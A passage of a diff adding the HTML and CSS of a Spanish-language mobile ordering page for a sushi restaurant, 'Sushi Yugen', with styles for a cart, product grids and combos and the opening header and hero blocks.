@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<!-- Versión: Sushi Yugen V2.4 · Exportado: 2026-09-29T00:05:24.912Z -->
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Sushi Yugen</title>
+<meta name="description" content="Sushi fresco, hecho al momento, delivery y para llevar.">
+<link rel="canonical" href="https://sushi-yugen.foodtap.net">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Sushi Yugen">
+<meta property="og:url" content="https://sushi-yugen.foodtap.net">
+<meta property="og:description" content="Sushi fresco, hecho al momento, delivery y para llevar.">
+<meta name="twitter:description" content="Sushi fresco, hecho al momento, delivery y para llevar.">
+<meta property="og:image" content="https://sushi-yugen.foodtap.net/images/og-image.jpg">
+<meta name="twitter:image" content="https://sushi-yugen.foodtap.net/images/og-image.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Sushi Yugen">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Playfair+Display:wght@400;500&family=Space+Grotesk:wght@400;500&family=Bebas+Neue&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+@font-face{font-family:'CustomFont_1790181491202';src:url('fonts/font_propia.ttf');}
+body{font-family:"Space Grotesk", sans-serif;background:rgb(0, 0, 0);color:#333;min-height:100vh;--btn-font:inherit}
+.lp-wrap{max-width:430px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:rgb(0, 0, 0);position:relative}
+
+/* HEADER */
+.lp-header{display:flex;align-items:center;justify-content:space-between;padding:6px 12px;border-bottom:.5px solid rgba(0,0,0,.08);min-height:48px;background:rgb(255, 0, 0);position:sticky;top:0;z-index:30}
+.logo-area{display:flex;align-items:center;gap:6px}
+.cart-icon-wrap{position:relative;cursor:pointer;display:flex;align-items:center;justify-content:center;width:32px;height:32px;border-radius:50%;transition:background .15s}
+.cart-icon-wrap:hover{background:rgba(0,0,0,.06)}
+.cart-icon-wrap i{font-size:20px;color:#fdfcfc}
+.cart-badge{position:absolute;top:-3px;right:-3px;min-width:16px;height:16px;border-radius:8px;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center;padding:0 4px;line-height:1;background:#080808;color:#ffffff}
+.cart-badge.hidden{display:none}
+
+/* CARRITO POPUP */
+.cart-popup{position:fixed;inset:0;z-index:50;display:flex;flex-direction:column;background:#fff;transform:translateY(100%);transition:transform .3s ease;max-width:430px;margin:0 auto}
+.cart-popup.open{transform:translateY(0)}
+.cart-popup-header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px 10px;border-bottom:.5px solid #e5e5e5;flex-shrink:0}
+.cart-popup-header h3{font-size:16px;font-weight:700}
+.cart-close{background:none;border:none;font-size:20px;cursor:pointer;color:#666;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:50%}
+.cart-close:hover{background:#f0f0f0}
+.cart-items{padding:10px 16px}
+.cart-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:180px;gap:8px;color:#aaa}
+.cart-scroll{flex:1;overflow-y:auto;display:flex;flex-direction:column}
+.cart-extras{padding:2px 16px 14px;display:none}
+.cart-extras.on{display:block}
+.cx-field{margin-top:12px;border-top:0.5px solid #f0f0f0;padding-top:11px}
+.cx-field.first{border-top:none;padding-top:4px}
+.cx-label{font-size:11.5px;font-weight:700;color:#1a1a1a;margin-bottom:6px;display:flex;align-items:center;gap:5px}
+.cx-label .cx-opt{font-weight:500;color:#aaa;font-size:10px}
+.cx-input,.cx-textarea{width:100%;border:1px solid #e3e3e3;border-radius:12px;padding:9px 11px;font-size:11.5px;font-family:inherit;color:#1a1a1a;outline:none;background:#fff;resize:vertical;box-sizing:border-box}
+.cx-input:focus,.cx-textarea:focus{border-color:#1a1a1a}
+.cx-textarea{min-height:54px;line-height:1.45}
+.cx-geo{margin-top:7px;width:100%;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px;border-radius:12px;border:1px solid #e3e3e3;background:#fafafa;font-size:11px;font-weight:600;color:#1a1a1a;cursor:pointer;font-family:inherit}
+.cx-geo:hover{background:#f0f0f0}
+.cx-geo-status{font-size:10px;margin-top:6px;line-height:1.4;display:none}
+.cx-geo-status.on{display:block}
+.cx-geo-status.ok{color:#16a34a}
+.cx-geo-status.err{color:#dc2626}
+.cx-chips{display:flex;flex-wrap:wrap;gap:6px}
+.cx-chip{display:inline-flex;align-items:center;gap:5px;padding:7px 11px;border:1px solid #e3e3e3;border-radius:20px;font-size:11px;cursor:pointer;background:#fff;color:#444;user-select:none;transition:all .15s}
+.cx-chip input{display:none}
+.cx-chip.sel{border-color:#1a1a1a;background:#1a1a1a;color:#fff}
+.cx-req{color:#dc2626;font-size:10px;margin-top:5px;display:none}
+.cx-req.on{display:block}
+
+.cart-empty i{font-size:32px}
+.cart-empty p{font-size:12px}
+.cart-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:.5px solid #f0f0f0}
+.cart-item:last-child{border-bottom:none}
+.cart-item-img{width:44px;height:44px;border-radius:8px;background:#f3f3f3;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.cart-item-img img{width:100%;height:100%;object-fit:cover}
+.cart-item-img i{font-size:16px;color:#ccc}
+.cart-item-info{flex:1;min-width:0}
+.cart-item-name{font-size:12px;font-weight:600;color:#1a1a1a;white-space:normal;word-break:break-word;line-height:1.4}
+.cart-item-price{font-size:11px;color:#666;margin-top:1px}
+.cart-item-qty{display:flex;align-items:center;gap:6px;flex-shrink:0}
+.qty-btn{width:22px;height:22px;border-radius:50%;border:1px solid #ddd;background:#fff;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;color:#333}
+.qty-btn:hover{background:#f5f5f5}
+.qty-num{font-size:12px;font-weight:600;min-width:16px;text-align:center}
+.cart-footer{padding:12px 16px;border-top:.5px solid #e5e5e5;flex-shrink:0;background:#fff}
+.cart-total-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.cart-sub-row,.cart-ship-row{margin-bottom:5px}
+.cart-sub-row .cart-total-lbl,.cart-ship-row .cart-total-lbl{font-size:11px}
+.cart-total-lbl{font-size:12px;color:#666}
+.cart-total-val{font-size:18px;font-weight:700;color:#1a1a1a}
+.cart-wa-btn{width:100%;padding:13px;border-radius:24px;background:#25D366;color:#fff;border:none;font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;text-decoration:none}
+.cart-wa-btn:hover{background:#1fbd5b}
+.cart-toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%) translateY(20px);background:#1a1a1a;color:#fff;padding:7px 14px;border-radius:20px;font-size:11px;font-weight:500;white-space:nowrap;opacity:0;transition:all .25s;pointer-events:none;z-index:60}
+.cart-toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* BLOQUES */
+.phone-block{margin:6px 8px;position:relative}
+.b-image{border-radius:8px;overflow:hidden;cursor:pointer}
+.b-image.fw{margin-left:-8px;margin-right:-8px;border-radius:0}
+.b-image img{width:100%;height:auto;display:block}
+.b-image-ph{display:none}
+.b-ticker{overflow:hidden;padding:7px 0}
+.b-ticker.fw{margin-left:-8px;margin-right:-8px;border-radius:0!important}
+.ticker-track{width:100%;overflow:hidden}
+.ticker-inner{display:flex;white-space:nowrap;font-size:11px}
+.b-faq{border-radius:8px;overflow:hidden}
+.faq-item{border-bottom:.5px solid rgba(0,0,0,.08)}
+.faq-item:last-child{border-bottom:none}
+.faq-q{display:flex;justify-content:space-between;align-items:center;padding:9px 10px;cursor:pointer;font-size:12px;font-weight:500;gap:6px}
+.faq-icon{font-size:16px;font-weight:300;flex-shrink:0;line-height:1;transition:transform .2s;color:#888}
+.faq-a{display:none;padding:0 10px 9px;font-size:11px;line-height:1.5}
+
+/* ── PLANES ── */
+.b-plans{border-radius:16px;padding:20px 16px;text-align:center}
+.plan-title{font-size:15px;font-weight:700;margin-bottom:4px}
+.plan-value{font-size:22px;font-weight:800;margin-bottom:14px}
+.plan-btn{display:block;width:100%;padding:12px;border:none;border-radius:12px;font-size:13px;font-weight:700;cursor:pointer;text-decoration:none;box-sizing:border-box;margin-bottom:14px;text-align:center}
+.plan-features{display:flex;flex-direction:column;gap:8px;text-align:left}
+.plan-feature-row{display:flex;align-items:flex-start;gap:10px}
+.plan-feature-icon{width:20px;flex-shrink:0;font-weight:700;font-size:13px;text-align:center}
+.plan-feature-text{flex:1;font-size:12px;line-height:1.5}
+
+/* ── PREGUNTAS PLANES ── */
+.faqplan-sub{padding:2px 10px 12px}
+.faqplan-sub-title{font-size:11px;font-weight:700;margin-bottom:8px}
+.faq-a.open{display:block}
+.faq-q.active .faq-icon{transform:rotate(45deg)}
+.b-button{display:flex;justify-content:center;padding:5px 0}
+.phone-btn{padding:10px 26px;border-radius:22px;font-size:13px;font-weight:500;cursor:pointer;border:none;text-decoration:none;display:inline-block;font-family:var(--btn-font,inherit)}
+.pbuy,.stack-cart-btn,.detail-cart-btn,.hero-btn,.sup-btn,.cart-wa-btn,.combo-btn,.combo-modal-buy,.gpw-more,.gpw-modal-buy,.plan-btn{font-family:var(--btn-font,inherit)}
+.b-product{border-radius:8px;overflow:hidden}
+.pcar-wrap{position:relative;overflow:hidden;width:100%;touch-action:pan-y;user-select:none}
+.pcar-track{display:flex;transition:transform .3s ease}
+.pcar-slide{min-width:100%;width:100%;flex-shrink:0}
+.pcar-slide img{width:100%;aspect-ratio:1/1;object-fit:cover;display:block;pointer-events:none}
+.cbtn{position:absolute;top:50%;transform:translateY(-50%);background:rgba(0,0,0,.38);color:#fff;border:none;border-radius:50%;width:22px;height:22px;cursor:pointer;font-size:11px;display:flex;align-items:center;justify-content:center;z-index:3}
+.cbtn.prev{left:5px}.cbtn.next{right:5px}
+.cdots{position:absolute;bottom:6px;left:50%;transform:translateX(-50%);display:flex;gap:4px}
+.cdot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,.5)}
+.cdot.active{background:#fff}
+.pinfo{padding:9px 10px}
+.pname{font-size:13px;font-weight:500;margin-bottom:3px}
+.pprices{display:flex;align-items:center;gap:6px;margin-bottom:5px}
+.pprice{font-size:15px;font-weight:600}
+.porig{font-size:11px;color:#aaa;text-decoration:line-through}
+.pbadge{background:#dc2626;color:#fff;font-size:9px;font-weight:600;padding:2px 5px;border-radius:3px}
+.pdesc{font-size:11px;line-height:1.5}
+.pbuy{margin-top:8px;border:none;border-radius:20px;padding:8px 0;width:100%;font-size:12px;font-weight:500;cursor:pointer;display:block}
+.b-text{padding:6px 10px;font-size:12px;line-height:1.6;border-radius:8px}
+.b-textmeta .textmeta-inner{font-size:12px;font-weight:400;margin:0}
+.b-divider hr{border:none;border-top:.5px solid rgba(0,0,0,.12);margin:2px 0}
+.b-footer{padding:14px 12px;text-align:center;line-height:1.8;margin:0 -8px;margin-top:auto}
+.footer-text{font-size:12px;font-weight:500;margin-bottom:3px}
+.footer-links{font-size:10px}
+.footer-link{color:inherit;opacity:.7;text-decoration:none;cursor:pointer}
+.footer-link:hover{opacity:1;text-decoration:underline}
+.footer-dot{opacity:.4;margin:0 5px}
+.footer-disclaimer{font-size:9px;opacity:.5;margin-top:10px;line-height:1.5;padding:0 10px}
+.b-hero{border-radius:20px;padding:20px 16px 16px;position:relative;overflow:hidden;min-height:220px}
+.hero-cat{font-size:9px;letter-spacing:2px;font-weight:700;margin-bottom:6px}
+.hero-title{font-size:34px;line-height:.92;font-weight:900;max-width:130px;margin-bottom:8px}
+.hero-code{font-size:16px;font-weight:700}
+.hero-float-img{position:absolute;right:-16px;top:42px;width:200px;aspect-ratio:3/2;object-fit:cover;z-index:2;pointer-events:none;border-radius:8px}
+.hero-float-ph{display:none}
+.b-hero-nobtn{padding-bottom:28px;min-height:190px}
+.hero-btn{margin-top:20px;width:100%;padding:12px;border:none;border-radius:12px;font-size:13px;font-weight:700;cursor:pointer;display:flex;justify-content:center;align-items:center;gap:6px;position:relative;z-index:3;text-decoration:none;box-sizing:border-box}
+.b-avatarrow{display:flex;align-items:center;justify-content:space-between;padding:5px 8px;border-radius:30px;gap:8px}
+.av-track-wrap{overflow:hidden;flex:1;min-width:0}
+.av-list{display:flex;align-items:center;gap:2px;width:max-content}
+.av-item{width:42px;height:42px;border-radius:50%;border:2px solid #F5F2EC;background:#ddd;overflow:hidden;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.av-item img{width:100%;height:100%;object-fit:cover}
+.av-item i{font-size:12px;color:#aaa}
+.b-bestplayers{border-radius:20px;overflow:hidden;padding:10px 14px}
+.b-bestplayers h3{font-size:30px;font-weight:800;text-align:center;margin-bottom:6px;letter-spacing:.5px}
+.bp-img-wrap{border-radius:16px;overflow:hidden;position:relative}
+.bp-img-wrap img{width:100%;height:auto;display:block}
+.bp-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(to top,rgba(0,0,0,.65) 0%,transparent 60%);padding:12px 10px 10px;text-align:center}
+.bp-sub{font-size:12px;font-weight:700;margin-bottom:5px;text-shadow:0 2px 4px rgba(0,0,0,.5)}
+.bp-pill{padding:4px 12px;border-radius:30px;font-size:10px;font-weight:700;display:inline-block}
+.bp-img-ph{display:none}
+.b-hcarousel{padding:6px 0}
+.b-hcarousel h4{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:0 10px 8px;opacity:.7}
+.hcar-wrap{display:flex;gap:8px;overflow-x:auto;padding:0 10px 6px;scrollbar-width:none}
+.hcar-wrap::-webkit-scrollbar{display:none}
+.hcar-slide{min-width:180px;height:110px;border-radius:14px;overflow:hidden;flex-shrink:0;background:#e0e0e0;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.hcar-slide img{width:100%;height:100%;object-fit:cover;pointer-events:none}
+.hcar-slide-ph{display:none}
+.b-gridproducts{padding:6px 2px}
+.b-gridproducts h4{font-size:24px;font-weight:900;margin-bottom:8px;letter-spacing:.5px}
+.gp-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;padding:0 4px}
+.gp-card{border-radius:16px;overflow:hidden;position:relative;aspect-ratio:1/1;display:flex;flex-direction:column;justify-content:flex-end;cursor:pointer;background:#ddd;text-decoration:none}
+.gp-bg{position:absolute;inset:0;background-size:cover;background-position:center;transition:transform .3s}
+.gp-card:hover .gp-bg{transform:scale(1.03)}
+.gp-card::before{content:'';position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.5) 0%,transparent 60%);z-index:1}
+.gp-info{position:relative;z-index:2;padding:8px;display:flex;align-items:flex-end;justify-content:space-between;gap:4px}
+.gp-text{min-width:0}
+.gp-cat{font-size:9px;text-transform:uppercase;letter-spacing:1px;opacity:.8;font-weight:700}
+.gp-name{font-size:12px;font-weight:700;line-height:1.2;margin:2px 0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.gp-price{font-size:11px;font-weight:600}
+.gp-cart-btn{flex-shrink:0;width:26px;height:26px;border-radius:50%;border:none;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.gp-card-ph{display:none}
+
+/* ── GRID PRODUCTOS VENTANA ── */
+.b-gridproductswindow{padding:6px 2px}
+.b-gridproductswindow h4{font-size:24px;font-weight:900;margin-bottom:8px;letter-spacing:.5px}
+.gpw-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;padding:0 4px}
+.gpw-card{border-radius:16px;overflow:hidden;position:relative;aspect-ratio:1/1;display:flex;flex-direction:column;justify-content:flex-end;background:#ddd}
+.gpw-bg{position:absolute;inset:0;background-size:cover;background-position:center}
+.gpw-bg-ph{display:none}
+.gpw-card::before{content:'';position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.55) 0%,transparent 55%);z-index:1}
+.gpw-info{position:relative;z-index:2;padding:8px;display:flex;align-items:flex-end;justify-content:space-between;gap:4px}
+.gpw-text{min-width:0}
+.gpw-cat{font-size:8px;text-transform:uppercase;letter-spacing:1px;opacity:.8;color:#fff;font-weight:700}
+.gpw-name{font-size:11px;font-weight:700;line-height:1.2;color:#fff;margin:2px 0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.gpw-price{font-size:10px;font-weight:600;color:#fff}
+.gpw-more{flex-shrink:0;border:none;border-radius:20px;padding:5px 9px;font-size:9px;font-weight:700;cursor:pointer;white-space:nowrap}
+.lp-overlay-backdrop{position:fixed;inset:0;z-index:54;max-width:430px;margin:0 auto;background:rgba(0,0,0,0);opacity:0;pointer-events:none;transition:opacity .25s,background .25s}
+.lp-overlay-backdrop.show{opacity:1;background:rgba(0,0,0,.55);pointer-events:auto}
+.lp-overlay-panel{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%) scale(.94);width:86%;max-width:320px;max-height:78%;z-index:55;display:flex;flex-direction:column;border-radius:20px;overflow:hidden;opacity:0;pointer-events:none;transition:opacity .2s,transform .2s;box-shadow:0 20px 50px rgba(0,0,0,.3)}
+.lp-overlay-panel.show{opacity:1;transform:translate(-50%,-50%) scale(1);pointer-events:auto}
+.gpw-modal-header{display:flex;justify-content:flex-end;padding:10px 12px}
+.gpw-modal-close{width:28px;height:28px;border-radius:50%;background:#f2f2f2;border:none;font-size:13px;cursor:pointer}
+.gpw-modal-body{flex:1;overflow-y:auto}
+.gpw-modal-img{width:100%;aspect-ratio:1/1;background:#eee;background-size:cover;background-position:center}
+.gpw-modal-content{padding:14px 16px}
+.gpw-modal-cat{font-size:10px;text-transform:uppercase;letter-spacing:1px;opacity:.6;margin-bottom:4px}
+.gpw-modal-name{font-size:17px;font-weight:700;margin-bottom:4px}
+.gpw-modal-price{font-size:15px;font-weight:600;margin-bottom:10px}
+.gpw-modal-desc{font-size:12px;line-height:1.6;color:#555}
+.gpw-modal-footer{padding:12px 16px 16px;border-top:.5px solid rgba(0,0,0,.08)}
+.gpw-modal-buy{width:100%;padding:12px;border:none;border-radius:12px;font-size:13px;font-weight:700;cursor:pointer}
+
+/* ── COMBO ── */
+.b-combo{border-radius:16px;overflow:hidden;cursor:pointer;display:flex;flex-direction:column}
+.combo-img-sq{aspect-ratio:1/1;object-fit:cover}
+.combo-img{width:100%;height:auto;display:block}
+.combo-img-ph{display:none}
+.combo-info{padding:10px 12px 4px;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.combo-name{font-size:14px;font-weight:700}
+.combo-price{font-size:13px;font-weight:600}
+.combo-btn{margin:8px 12px 12px;padding:10px;border:none;border-radius:12px;font-size:12px;font-weight:700;cursor:pointer}
+.combo-modal-header{display:flex;justify-content:flex-end;padding:10px 12px}
+.combo-modal-close{width:28px;height:28px;border-radius:50%;background:#f2f2f2;border:none;font-size:13px;cursor:pointer}
+.combo-modal-body{flex:1;overflow-y:auto;padding:0 16px 12px}
+.combo-modal-title{font-size:16px;font-weight:700;margin-bottom:4px}
+.combo-modal-desc{font-size:12px;color:#666;line-height:1.5;margin-bottom:14px}
+.combo-section{margin-bottom:16px}
+.combo-section-title{font-size:12px;font-weight:700;margin-bottom:8px}
+.combo-count{font-weight:500;opacity:.6}
+.combo-options{display:flex;flex-direction:column;gap:6px}
+.combo-option{display:flex;align-items:center;gap:8px;padding:8px 10px;border:1.5px solid #e5e5e5;border-radius:10px;font-size:12px;cursor:pointer}
+.combo-qty-row{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:8px 10px;border:1.5px solid #e5e5e5;border-radius:10px;font-size:12px}
+.combo-qty-ctrl{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.combo-qty-ctrl button{width:22px;height:22px;border-radius:50%;border:1px solid #d5d5d5;background:#fff;font-size:14px;line-height:1;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0}
+.combo-qty-ctrl button:hover{border-color:#1a1a1a}
+.combo-qty-num{min-width:14px;text-align:center;font-weight:600}
+.combo-name-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.promo-badge{font-size:9.5px;font-weight:700;padding:2px 7px;border-radius:10px;background:#fef2f2;color:#dc2626;white-space:nowrap}
+.promo-badge.inactive{background:#f2f2f2;color:#999}
+
+.combo-option input{accent-color:#111}
+.combo-modal-footer{padding:12px 16px 16px;border-top:.5px solid rgba(0,0,0,.08)}
+.combo-modal-buy{width:100%;padding:12px;border:none;border-radius:12px;font-size:13px;font-weight:700;cursor:pointer}
+.b-supplement{border-radius:22px;overflow:hidden;position:relative;aspect-ratio:1/1;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;text-align:center;padding:0}
+.sup-bg-layer{background:linear-gradient(170deg,rgba(255,255,255,.4),rgba(255,255,255,.1));padding:14px 12px 0}
+.sup-img-wrap{position:relative;display:flex;justify-content:center}
+.sup-img-wrap img{height:120px;object-fit:contain}
+.sup-img-ph{display:none}
+.sup-float{position:absolute;top:8px;right:0;background:#1a1a1a;color:#fff;font-size:8px;font-weight:700;padding:4px 8px;border-radius:10px}
+.sup-bottom{padding:10px 12px 12px}
+.sup-tags{display:flex;gap:5px;margin-bottom:6px;flex-wrap:wrap}
+.sup-tag{background:rgba(0,0,0,.08);font-size:9px;font-weight:600;padding:3px 7px;border-radius:10px}
+.sup-title{font-size:16px;font-weight:800;line-height:1.1;margin-bottom:4px}
+.sup-desc{font-size:10px;line-height:1.5;opacity:.7;margin-bottom:10px}
+.sup-btn{width:100%;padding:10px;border-radius:18px;border:none;font-size:12px;font-weight:700;cursor:pointer}
+.b-foodstack{border-radius:16px;overflow:visible;padding:0;background:transparent}
+.b-foodstack .stack-hint{text-align:center;font-size:10px;color:#636366;margin-top:8px}
+.stack-container{position:relative;width:100%;height:360px;display:flex;justify-content:center}
+.tarjeta-stack{position:absolute;width:90%;height:340px;border-radius:28px;padding:18px;box-shadow:0 12px 28px rgba(0,0,0,0.35);display:flex;flex-direction:column;justify-content:space-between;cursor:grab;transition:transform .3s ease,opacity .3s ease;transform-origin:center bottom}
+.tarjeta-stack:active{cursor:grabbing}
+.tarjeta-stack.atras-2{transform:scale(0.9) translate3d(0,-18px,0) rotate(-6deg);opacity:.3}
+.tarjeta-stack.atras-1{transform:scale(0.95) translate3d(0,-9px,0) rotate(-3deg);opacity:.7}
+.tarjeta-stack.al-frente{transform:scale(1) translate3d(0,0,0) rotate(2deg);opacity:1;z-index:10}
+.tarjeta-stack.descartada-izq{transform:translate3d(-150%,50px,0) rotate(-20deg)!important;opacity:0}
+.tarjeta-stack.descartada-der{transform:translate3d(150%,50px,0) rotate(20deg)!important;opacity:0}
+.stack-img-wrap{width:100%;aspect-ratio:1/1;border-radius:20px;overflow:hidden;background:#2c2c2e;pointer-events:none;max-height:200px}
+.stack-img-wrap img{width:100%;height:100%;object-fit:cover}
+.stack-img-ph{width:100%;max-height:200px;aspect-ratio:1/1;border-radius:20px;background:#2c2c2e;display:flex;align-items:center;justify-content:center;color:#666;pointer-events:none}
+.stack-info h3{font-size:15px;margin:10px 0 4px;font-weight:700;line-height:1.2}
+.stack-meta{display:flex;justify-content:space-between;align-items:center;font-size:12px;opacity:.75}
+.stack-meta .rating-s{color:#FFB300;font-weight:700}
+.stack-cart-btn{margin-top:10px;width:100%;border:none;border-radius:14px;padding:9px;font-size:12px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;transition:all .2s}
+.stack-wrap{position:relative}
+.stack-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:20;width:34px;height:34px;border-radius:50%;border:none;background:rgba(0,0,0,.55);color:#fff;font-size:16px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .2s}
+.stack-arrow:hover{background:rgba(0,0,0,.75)}
+.stack-arrow-left{left:-6px}
+.stack-arrow-right{right:-6px}
+.b-fooddetail{border-radius:28px;overflow:hidden;padding:20px 18px;color:#fff}
+.detail-img-wrap{border-radius:24px;overflow:hidden;margin-bottom:16px;background:#2c2c2e}
+.detail-img-wrap img{width:100%;height:auto;display:block}
+.detail-img-ph{display:none}
+.b-fooddetail h2{font-size:18px;font-weight:700;margin:0 0 8px;line-height:1.2}
+.b-fooddetail .detail-meta{display:flex;align-items:center;gap:16px;font-size:12px;margin-bottom:12px}
+.b-fooddetail .detail-meta .r-star{color:#FFB300;font-weight:700}
+.b-fooddetail .detail-desc{font-size:11px;line-height:1.5;margin-bottom:14px}
+.b-fooddetail .detail-ingr h4{font-size:12px;font-weight:700;margin:0 0 8px}
+.b-fooddetail .ingr-list{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.b-fooddetail .ingr-icon{width:38px;height:38px;background:#2C2C2E;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:17px}
+.b-fooddetail .detail-footer{display:flex;justify-content:space-between;align-items:center;border-top:1px solid #2C2C2E;padding-top:14px;gap:12px}
+.b-fooddetail .price-block span{font-size:10px}
+.b-fooddetail .price-block p{margin:0;font-size:18px;font-weight:700}
+.b-fooddetail .detail-cart-btn{flex:1;border:none;border-radius:14px;padding:12px;font-size:12px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px}
+.b-map{border-radius:16px;overflow:hidden;position:relative}
+.b-map iframe{width:100%;height:200px;border:none;display:block;pointer-events:none}
+.b-map .map-label{font-size:11px;color:#555;padding:7px 10px 5px;background:#fff;display:flex;align-items:center;gap:5px}
+.b-map .map-label i{font-size:13px;color:#ea4335}
+.b-heading{padding:6px 10px}
+.b-heading .heading-text{font-weight:800;line-height:1.15;word-break:break-word;margin:0}
+.b-tiltedticker-wrap{overflow:hidden;position:relative;margin:0 -8px;display:flex;align-items:center;justify-content:center}
+.b-tiltedticker{position:relative;transform-origin:center center;white-space:nowrap}
+.b-tiltedticker .ticker-track{overflow:hidden}
+.b-tiltedticker .ticker-inner{display:flex;white-space:nowrap}
+.b-productvariants{border-radius:8px;overflow:hidden}
+.pv-images{position:relative;background:#f3f3f3;overflow:hidden}
+.pv-images img{width:100%;aspect-ratio:1/1;object-fit:cover;display:block}
+.pv-car-wrap{position:relative;overflow:hidden;width:100%}
+.pv-car-track{display:grid;grid-auto-flow:column;grid-auto-columns:100%;width:100%;transition:transform .3s ease}
+.pv-slide{width:100%;min-width:0}
+.pv-slide img{width:100%;aspect-ratio:1/1;object-fit:cover;display:block}
+.pv-car-btn{position:absolute;top:50%;transform:translateY(-50%);background:rgba(0,0,0,.38);color:#fff;border:none;border-radius:50%;width:24px;height:24px;cursor:pointer;font-size:12px;display:flex;align-items:center;justify-content:center;z-index:3;padding:0}
+.pv-prev{left:6px}.pv-next{right:6px}
+.pv-dots{position:absolute;bottom:6px;left:50%;transform:translateX(-50%);display:flex;gap:4px}
+.pv-dot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,.5)}
+.pv-dot.active{background:#fff}
+.pv-info{padding:10px 12px 4px}
+.pv-name{font-size:14px;font-weight:700;margin-bottom:3px}
+.pv-desc{font-size:11px;margin-bottom:10px}
+.pv-variants{display:flex;flex-direction:column;gap:6px;padding:0 12px 12px}
+.pv-variant{display:flex;align-items:center;justify-content:space-between;padding:9px 12px;border-radius:20px;border:1.5px solid #e5e5e5;cursor:pointer;transition:border-color .15s,background .15s;background:var(--pv-bg,#fff)}
+.pv-variant.selected{border-color:var(--pv-selected,#111);background:var(--pv-selected-bg,#f5f5f5)}
+.pv-variant-label{font-size:12px;font-weight:500}
+.pv-variant-price{font-size:13px;font-weight:700}
+.pv-buy{width:calc(100% - 24px);margin:0 12px 12px;padding:11px;border-radius:20px;font-size:13px;font-weight:700;cursor:pointer;border:none;display:block;font-family:var(--btn-font,inherit)}
+.b-reviews{border-radius:8px;overflow:hidden;padding:10px}
+.b-reviews.fw{margin-left:-8px;margin-right:-8px;border-radius:0}
+.review-item{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:.5px solid rgba(0,0,0,.07)}
+.review-item:last-child{border-bottom:none}
+.review-avatar{width:40px;height:40px;border-radius:50%;background:#e8e8e8;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.review-avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.review-avatar i{font-size:16px;color:#ccc}
+.review-body{flex:1;min-width:0}
+.review-name{font-size:11px;font-weight:700;margin-bottom:3px}
+.review-text{font-size:11px;line-height:1.5}
+.lp-content{flex:1;padding-bottom:20px;display:flex;flex-direction:column}
+</style>
+</head>
+<body>
+<div class="lp-wrap">
+  <div class="lp-header">
+    <div class="logo-area">
+      <img src="images/img1.png" alt="Logo" style="width:86px;height:36px;object-fit:contain;display:block">
+    </div>
+    <div class="cart-icon-wrap" onclick="toggleCart()" title="Ver carrito">
+      <i class="ti ti-shopping-cart"></i>
+      <div class="cart-badge hidden" id="cart-badge">0</div>
+    </div>
+  </div>
+  <div class="lp-content" id="lp-content" style="background:rgb(0, 0, 0)">
+<div class="phone-block" data-id="b1" style="outline: none;"><div class="b-image fw" style="background:transparent"><img loading="lazy" src="images/img2.png" alt=""></div></div>
+<div class="phone-block" data-id="b2" style="outline: none;"><div class="b-hero b-hero-nobtn" style="background:#000000"><p class="hero-cat" style="color:#fafafa">SUSHI BAR</p><h2 class="hero-title" style="color:#fafafa">SUSHI FRESCO, HECHO AL MOMENTO</h2><p class="hero-code" style="color:#fafafa">🍣 Delivery y para llevar</p><img src="images/img3.png" class="hero-float-img" alt=""></div></div>
